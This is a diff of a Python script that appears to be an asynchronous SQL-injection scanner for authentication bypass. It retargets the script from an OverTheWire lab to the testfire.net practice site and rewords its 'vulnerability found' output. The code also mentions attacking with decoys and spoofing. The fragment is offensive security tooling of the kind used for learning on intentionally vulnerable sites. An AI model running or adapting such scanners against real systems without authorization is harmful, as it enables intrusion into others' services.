@@ -24,6 +24,8 @@ https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the
 
 """This is When we want to attack with decoy and use spoofing """
 
+"""Tested against: http://testfire.net/login.jsp """
+
 
 ####################################33
 pattern = r"\berror\b"
@@ -81,12 +83,12 @@ async def auth_SQL_inj_HEADER(urls):
                             # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                             await asyncio.sleep(5) #! This prevent the program from crashing 
                             if "error" in ack.text: #* if the error word was in the test result we inform the user
-                                print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"\n|Headers:|",header)
+                                print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in the response code:|", ack.text,"\n|Headers:|",header)
                                 
                             vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) #* use regex patterns for the better searching
                             htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                             if vuln: #* if the regex pattern founds we inform the user
-                                print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found Status: |", ack.text," | with the count of: |",len(vuln),"|Attack:|"+"|authentication bypass SQL injection|","\n|Headers:|",header)
+                                print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found in the response code: |", ack.text," | vulnerability |",vuln,"|Attack:|"+"|authentication bypass SQL injection|","\n|Headers:|",header)
                                 await asyncio.sleep(3) #* Stop the program for 5 sec
                             
                             if htmlVULN:
@@ -216,5 +218,5 @@ async def auth_SQL_inj_HEADER(urls):
 async def auth_main(urL):
     await auth_SQL_inj(urL)
 
-asyncio.run(auth_SQL_inj_HEADER("https://redtiger.labs.overthewire.org/level1.php"))
+asyncio.run(auth_SQL_inj_HEADER("http://testfire.net/login.jsp"))
 # print(capturesAUTHBYPASS)
